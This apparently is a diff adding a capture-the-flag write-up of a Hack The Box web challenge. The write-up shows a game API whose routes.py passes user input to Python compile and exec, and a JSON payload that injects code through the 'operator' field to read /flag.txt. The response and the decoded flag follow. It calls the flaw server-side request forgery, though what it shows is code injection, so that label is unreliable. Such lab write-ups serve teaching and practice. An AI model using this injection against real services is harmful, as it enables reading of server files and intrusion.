@@ -1,0 +1,65 @@
+<h1 id="evaluation-deck"><a aria-hidden="true" class="anchor-heading icon-link" href="#evaluation-deck"></a>Evaluation Deck</h1>
+<h2 id="target-information"><a aria-hidden="true" class="anchor-heading icon-link" href="#target-information"></a>Target Information</h2>
+<ul>
+<li>IP: <code>157.245.42.104:31254</code></li>
+<li>Game application with public API at <code>http://157.245.42.104:31254/api/get_health</code>
+<ul>
+<li>Can interface with it via <code>curl</code>:
+<pre class="language-shell"><code class="language-shell"><span class="token function">curl</span> -X POST -H <span class="token string">"Content-Type: application/json"</span> -d <span class="token string">'{"attack_power":"90","current_health":"100","operator":"+"}'</span> http://157.245.42.104:31254/api/get_health
+</code></pre>
+</li>
+</ul>
+</li>
+<li>Running Docker</li>
+</ul>
+<h2 id="exploitation"><a aria-hidden="true" class="anchor-heading icon-link" href="#exploitation"></a>Exploitation</h2>
+<ul>
+<li>
+<p>Opened the application in the Burp Suite proxy and sent a request to the API:</p>
+<pre class="language-json"><code class="language-json"><span class="token punctuation">{</span>
+  <span class="token property">"attack_power"</span><span class="token operator">:</span> <span class="token string">"90"</span><span class="token punctuation">,</span>
+  <span class="token property">"current_health"</span><span class="token operator">:</span> <span class="token string">"100"</span><span class="token punctuation">,</span>
+  <span class="token property">"operator"</span><span class="token operator">:</span> <span class="token string">"+"</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>  The response was:</p>
+<pre class="language-json"><code class="language-json"><span class="token punctuation">{</span>
+  <span class="token property">"message"</span><span class="token operator">:</span> <span class="token string">"190"</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>  This means that the API is vulnerable to a <a href="https://portswigger.net/web-security/ssrf">server-side request forgery</a> attack.</p>
+<p>  The following lines in <code>routes.py</code> show that the API is vulnerable:</p>
+<pre class="language-python"><code class="language-python">code <span class="token operator">=</span> <span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'result = </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">int</span><span class="token punctuation">(</span>current_health<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">{</span>operator<span class="token punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">int</span><span class="token punctuation">(</span>attack_power<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> <span class="token string">'&#x3C;string>'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">)</span>
+<span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> result<span class="token punctuation">)</span>
+<span class="token keyword">return</span> response<span class="token punctuation">(</span>result<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'result'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
+</li>
+<li>
+<p>Attempted to use the API to access the flag on the Docker filesystem:</p>
+<pre class="language-json"><code class="language-json"><span class="token punctuation">{</span>
+  <span class="token property">"attack_power"</span><span class="token operator">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span>
+  <span class="token property">"current_health"</span><span class="token operator">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span>
+  <span class="token property">"operator"</span><span class="token operator">:</span> <span class="token string">"+ int(''.join([str(ord(x)) for x in list(open('/flag.txt').read())])) +"</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>  The response was:</p>
+<pre class="language-json"><code class="language-json"><span class="token punctuation">{</span>
+  <span class="token property">"message"</span><span class="token operator">:</span> <span class="token number">728466123994810051954911010651991164948110115955211451957111451971163333125</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>  I converted this number from the Python <code>ord</code> positions of the flag to ASCII to get the flag:</p>
+<pre class="language-text"><code class="language-text">HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}
+</code></pre>
+</li>
+</ul>
+<h2 id="final-thoughts"><a aria-hidden="true" class="anchor-heading icon-link" href="#final-thoughts"></a>Final Thoughts</h2>
+<p>A complete write-up of this challenge can be found on <a href="https://medium.com/meese-enterprises/walkthrough-hack-the-boo-2022-evaluation-deck-challenge-8933e0b4b168">Medium</a>, please check it out and show your support by leaving some claps and sharing it with your friends!</p>
+<p>The files for this challenge can be found in the <a href="/bits-and-bobbles/./assets/hackthebox/HackTheBoo2022/EvaluationDeck">assets folder</a> if you would like to try it out for yourself.</p>
+<hr>
+<h2 id="tags"><a aria-hidden="true" class="anchor-heading icon-link" href="#tags"></a>Tags</h2>
+<ol>
+<li><a title="Private" href="https://wiki.dendron.so/notes/hfyvYGJZQiUwQaaxQO27q.html" target="_blank" class="private">hackthebox (Private)</a></li>
+<li><a title="Private" href="https://wiki.dendron.so/notes/hfyvYGJZQiUwQaaxQO27q.html" target="_blank" class="private">web (Private)</a></li>
+<li><a title="Private" href="https://wiki.dendron.so/notes/hfyvYGJZQiUwQaaxQO27q.html" target="_blank" class="private">code-injection (Private)</a></li>
+<li><a title="Private" href="https://wiki.dendron.so/notes/hfyvYGJZQiUwQaaxQO27q.html" target="_blank" class="private">python (Private)</a></li>
+</ol>
